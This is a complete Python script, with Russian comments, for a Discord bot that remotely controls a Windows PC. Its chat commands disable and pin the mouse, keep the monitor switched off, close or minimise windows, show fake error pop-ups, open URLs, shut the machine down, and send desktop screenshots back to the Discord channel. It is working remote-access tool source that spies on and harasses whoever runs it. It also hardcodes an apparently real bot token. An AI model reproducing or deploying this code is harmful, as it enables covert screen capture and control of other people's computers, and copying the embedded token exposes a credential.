import discord
from discord.ext import commands
import ctypes
import pyautogui
import threading
import signal
import sys
import os
import webbrowser
from datetime import datetime
from ctypes import POINTER, cast
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import psutil
import win32gui
import win32con
import concurrent.futures
import asyncio

# Устанавливаем необходимые намерения
intents = discord.Intents.default()
intents.message_content = True

# Создаем объект бота с префиксом "/"
bot = commands.Bot(command_prefix="/", intents=intents)

# Флаги для контроля состояния мыши и монитора
mouse_disabled = False
monitor_disabled = False
lock = threading.Lock()

# Список открытых приложений
open_apps = []

# Функция для включения/отключения курсора
def set_cursor_state(show=True):
    ctypes.windll.user32.ShowCursor(show)

# Функция для фиксации мыши в одном месте
def hold_mouse():
    global mouse_disabled
    while mouse_disabled:
        pyautogui.moveTo(100, 100)  # Фиксируем мышь в координатах (100, 100)
        threading.Event().wait(0.1)

# Функция для сворачивания всех окон
def minimize_all_windows():
    pyautogui.hotkey('win', 'd')

# Функции для включения и отключения монитора
def monitor_off():
    ctypes.windll.user32.SendMessageW(ctypes.windll.user32.GetForegroundWindow(), 0x112, 0xF170, 2)

def monitor_on():
    pyautogui.press('shift')

# Функция для эмуляции нажатия кнопки Windows
def press_windows_key():
    pyautogui.hotkey('win')

# Поток для бесконечного отключения монитора
def continuous_monitor_off():
    global monitor_disabled
    while monitor_disabled:
        monitor_off()
        threading.Event().wait(0.5)  # Задержка между попытками отключения монитора

# Обработчики сигналов для восстановления устройств при аварийном завершении
def signal_handler(sig, frame):
    global mouse_disabled, monitor_disabled
    with lock:
        mouse_disabled = False
        monitor_disabled = False
    set_cursor_state(True)
    monitor_on()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# Функция для получения текущего времени в нужном формате
def current_time():
    return datetime.now().strftime("%H:%M")

# Функция для установки громкости
def set_volume(volume):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume_interface = cast(interface, POINTER(IAudioEndpointVolume))
    volume_interface.SetMasterVolumeLevelScalar(volume / 100.0, None)

# Функция для показа сообщения об ошибке Windows
def show_error_message(text):
    ctypes.windll.user32.MessageBoxW(0, text, "Error", 0x10)

# Функция для получения списка запущенных приложений
def get_open_apps():
    def callback(hwnd, apps):
        if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
            apps.append((win32gui.GetWindowText(hwnd), hwnd))
        return True

    open_apps = []
    win32gui.EnumWindows(callback, open_apps)
    return open_apps

# Функция для закрытия приложения по его hwnd
def close_app(hwnd):
    win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
import concurrent.futures

# Команда для сворачивания всех окон
@bot.command(name='closeapps')
async def closeapps(ctx):
    minimize_all_windows()
    await ctx.send(f'{current_time()} [⚡️] успешно')

# Команда для отключения мыши
@bot.command(name='offmouse')
async def offmouse(ctx):
    global mouse_disabled
    with lock:
        mouse_disabled = True
    set_cursor_state(False)  # Скрываем курсор
    threading.Thread(target=hold_mouse).start()
    await ctx.send(f'{current_time()} [⚡️] успешно')

# Команда для включения мыши
@bot.command(name='onmouse')
async def onmouse(ctx):
    global mouse_disabled
    with lock:
        mouse_disabled = False
    set_cursor_state(True)  # Показываем курсор
    await ctx.send(f'{current_time()} [⚡️] успешно')

# Команда для отключения монитора
@bot.command(name='offmonitor')
async def offmonitor(ctx):
    global monitor_disabled
    with lock:
        monitor_disabled = True
    threading.Thread(target=continuous_monitor_off).start()
    await ctx.send(f'{current_time()} [⚡️] успешно')

# Команда для включения монитора
@bot.command(name='onmonitor')
async def onmonitor(ctx):
    global monitor_disabled
    with lock:
        monitor_disabled = False
    monitor_on()
    await ctx.send(f'{current_time()} [⚡️] успешно')

# Команда для эмуляции нажатия кнопки Windows
@bot.command(name='buttonwin')
async def buttonwin(ctx):
    press_windows_key()
    await ctx.send(f'{current_time()} [⚡️] успешно')

# Команда для отправки скриншота рабочего стола
@bot.command(name='sends')
async def sends(ctx):
    screenshot_path = 'screenshot.png'
    pyautogui.screenshot(screenshot_path)
    await ctx.send(file=discord.File(screenshot_path))
    os.remove(screenshot_path)
    await ctx.send(f'{current_time()} [⚡️] успешно')

# Команда для вывода помощи
@bot.command(name='helpi')
async def help(ctx):
    help_text = (
        "1. Закрыть все окна /closeapps\n"
        "2. Выключить/Включить мышку /offmouse /onmouse\n"
        "3. Выключить/Включить монитор /offmonitor /onmonitor\n"
        "4. Нажатие на кнопку Win /buttonwin\n"
        "5. Отправить скриншот с раб.стола /sends\n"
        "6. Установить громкость /setvolume <0-100>\n"
        "7. Вывести сообщение об ошибке /error <текст>\n"
        "8. Вывести все открытые программы /openmanage\n"
        "9. Закрыть программу по номеру /close <номер>\n"
        "10. Помощь в командах /helpi\n"
        "11. Перенаправить браузер на URL /redirect <url>\n"
        "12. Выключить ПК /offpc"
    )
    await ctx.send(help_text)

# Команда для перенаправления браузера на указанный URL
@bot.command(name='redirect')
async def redirect(ctx, url: str):
    webbrowser.open(url, new=0)  # Открыть URL в текущем браузере
    await ctx.send(f'Перенаправление на {url}')
    await ctx.send(f'{current_time()} [⚡️] успешно')

# Команда для установки громкости
@bot.command(name='setvolume')
async def setvolume(ctx, volume: int):
    if 0 <= volume <= 100:
        set_volume(volume)
        await ctx.send(f'{current_time()} [⚡️] успешно')
    else:
        await ctx.send('Пожалуйста, укажите значение громкости в диапазоне от 0 до 100.')

# Команда для вывода сообщения об ошибке
@bot.command(name='error')
async def error(ctx, *, text: str):
    loop = asyncio.get_event_loop()
    with concurrent.futures.ThreadPoolExecutor() as pool:
        await loop.run_in_executor(pool, show_error_message, text)
    await ctx.send(f'{current_time()} [⚡️] Ошибка отображена.')

# Команда для вывода всех открытых программ
@bot.command(name='openmanage')
async def openmanage(ctx):
    global open_apps
    open_apps = get_open_apps()
    apps_text = '\n'.join([f'{i+1}. {app[0]}' for i, app in enumerate(open_apps)])
    # Разбиваем сообщение на части, если оно слишком длинное
    if len(apps_text) > 2000:
        for i in range(0, len(apps_text), 2000):
            await ctx.send(apps_text[i:i+2000])
    else:
        await ctx.send(apps_text)
    await ctx.send(f'{current_time()} [⚡️] успешно')

# Команда для закрытия приложения по номеру
@bot.command(name='close')
async def close(ctx, number: int):
    global open_apps
    if 1 <= number <= len(open_apps):
        hwnd = open_apps[number-1][1]
        close_app(hwnd)
        await ctx.send(f'{current_time()} [⚡️] успешно')
    else:
        await ctx.send('Неверный номер процесса.')

# Команда для выключения ПК
@bot.command(name='offpc')
async def offpc(ctx):
    os.system('shutdown /s /t 1')
    await ctx.send(f'{current_time()} [⚡️] ПК будет выключен')

# Запускаем бота с указанным токеном
bot.run('MTI2NjQ1MDk2NjgxNTgzODM0MA.GDma5a.ujZoOSDNDLqH5rKDqIRwTZ4Tykz84QvF94AyuI')
